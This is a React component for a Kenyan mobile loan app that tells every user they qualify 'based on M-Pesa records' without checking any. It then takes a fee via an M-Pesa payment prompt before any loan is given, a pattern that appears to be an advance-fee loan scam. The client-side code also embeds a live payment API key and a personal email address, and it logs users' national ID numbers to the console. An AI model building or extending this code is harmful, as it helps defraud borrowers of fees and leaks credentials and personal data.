import { useState } from "react";
import { Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { LoanCard } from "@/components/LoanCard";
import { LOAN_OPTIONS, type LoanOption, type UserData } from "@/types/loan";
import { useToast } from "@/hooks/use-toast";

interface LoanSelectionProps {
  userData: UserData;
  onPaymentInitiated: (loan: LoanOption, transactionId: string) => void;
}

export function LoanSelection({ userData, onPaymentInitiated }: LoanSelectionProps) {
  const [selectedLoan, setSelectedLoan] = useState<LoanOption | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const { toast } = useToast();

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat("en-KE").format(amount);
  };

  const getFirstName = (fullName: string) => {
    return fullName.split(" ")[0];
  };

  const initiatePayment = async () => {
    if (!selectedLoan) {
      toast({
        title: "Please select a loan amount",
        variant: "destructive",
      });
      return;
    }

    setIsProcessing(true);

    try {
      // Format phone number for M-Pesa (add 254 prefix and remove any spaces or dashes)
      let formattedPhone = userData.phoneNumber.replace(/\s+|-/g, '');
      
      if (formattedPhone.startsWith("0")) {
        formattedPhone = "254" + formattedPhone.slice(1);
      } else if (formattedPhone.startsWith("+254")) {
        formattedPhone = formattedPhone.slice(1);
      } else if (formattedPhone.startsWith("7") && formattedPhone.length === 9) {
        formattedPhone = "254" + formattedPhone;
      }

      // Validate phone number
      if (!/^254[17]\d{8}$/.test(formattedPhone)) {
        throw new Error("Invalid phone number format. Please use a valid Kenyan phone number.");
      }

      // LIVE API payload - Fixed: Added required amount field
      const payload = {
        api_key: "MGPYQeo8SNJp", 
        email: "collinskiptoo230@gmail.com", 
        amount: selectedLoan.fee.toString(), // CRITICAL: This was missing!
        msisdn: formattedPhone,
        reference: `LOAN-${Date.now()}-${userData.idNumber}-${selectedLoan.amount}`,
      };

      console.log("Initiating LIVE STK push with payload:", payload);

      // Add timeout to prevent hanging requests
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 seconds timeout

      // LIVE endpoint
      const response = await fetch("https://megapay.co.ke/backend/v1/initiatestk", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        signal: controller.signal,
        body: JSON.stringify(payload),
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      console.log("Payment Response:", data);

      // Enhanced response handling
      if (data.success || data.status === "success" || data.success === "200" || 
          (data.message && data.message.toLowerCase().includes("success"))) {
        toast({
          title: "Payment request sent!",
          description: "Check your phone for the M-Pesa prompt.",
        });
        onPaymentInitiated(selectedLoan, 
          data.transaction_request_id || 
          data.transactionId || 
          data.requestId || 
          data.ref || 
          "");
      } else {
        // More specific error messages
        let errorMsg = data.message || data.error || data.errorMessage || "Payment initiation failed";
        
        // Handle common errors
        if (errorMsg.toLowerCase().includes("insufficient")) {
          errorMsg = "Insufficient funds in your merchant account";
        } else if (errorMsg.toLowerCase().includes("limit")) {
          errorMsg = "Transaction limit exceeded. Please contact support.";
        } else if (errorMsg.toLowerCase().includes("invalid api")) {
          errorMsg = "API key invalid. Please check your MegaPay account.";
        } else if (errorMsg.toLowerCase().includes("amount")) {
          errorMsg = "Invalid amount specified. Please check the transaction fee.";
        }
        
        throw new Error(errorMsg);
      }
    } catch (error) {
      console.error("Payment error:", error);
      
      let userMessage = "Please try again or contact support.";
      if (error.name === "AbortError") {
        userMessage = "Request timed out. Please check your connection.";
      } else if (error.message.includes("Failed to fetch")) {
        userMessage = "Network error. Please check your internet connection.";
      }
      
      toast({
        title: "Payment failed",
        description: error instanceof Error ? error.message : userMessage,
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="w-full max-w-4xl mx-auto animate-fade-in">
      <div className="text-center mb-8">
        <h2 className="text-2xl sm:text-3xl font-display font-bold text-foreground mb-3">
          Hi {getFirstName(userData.fullName)}, you qualify! 🎉
        </h2>
        <p className="text-muted-foreground max-w-lg mx-auto">
          Based on your M-Pesa records, here are your loan options
          <span className="block mt-1 text-sm">
            (2-month term at 10% interest)
          </span>
        </p>
      </div>

      <div className="mb-6">
        <h3 className="text-lg font-semibold text-foreground mb-4 text-center">
          Select Your Loan Amount
        </h3>
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
          {LOAN_OPTIONS.map((option) => (
            <LoanCard
              key={option.amount}
              option={option}
              isSelected={selectedLoan?.amount === option.amount}
              onSelect={() => setSelectedLoan(option)}
            />
          ))}
        </div>
      </div>

      {selectedLoan && (
        <div className="bg-success-light rounded-xl p-4 mb-6 animate-scale-in">
          <div className="text-center">
            <p className="text-sm text-muted-foreground mb-1">You selected</p>
            <p className="text-2xl font-bold text-foreground">
              Ksh {formatCurrency(selectedLoan.amount)}
            </p>
            <p className="text-sm text-muted-foreground mt-1">
              Transaction fee: <span className="font-medium text-primary">Ksh {formatCurrency(selectedLoan.fee)}</span>
            </p>
          </div>
        </div>
      )}

      <Button
        onClick={initiatePayment}
        disabled={!selectedLoan || isProcessing}
        className="btn-primary-lg w-full text-primary-foreground"
      >
        {isProcessing ? (
          <>
            <Loader2 className="mr-2 h-5 w-5 animate-spin-slow" />
            Sending M-Pesa request...
          </>
        ) : (
          "Get Loan Now"
        )}
      </Button>

      <p className="mt-4 text-center text-sm text-muted-foreground">
        You will receive an M-Pesa prompt to pay the transaction fee of{" "}
        <span className="font-medium">
          Ksh {selectedLoan ? formatCurrency(selectedLoan.fee) : "---"}
        </span>
      </p>
    </div>
  );
}
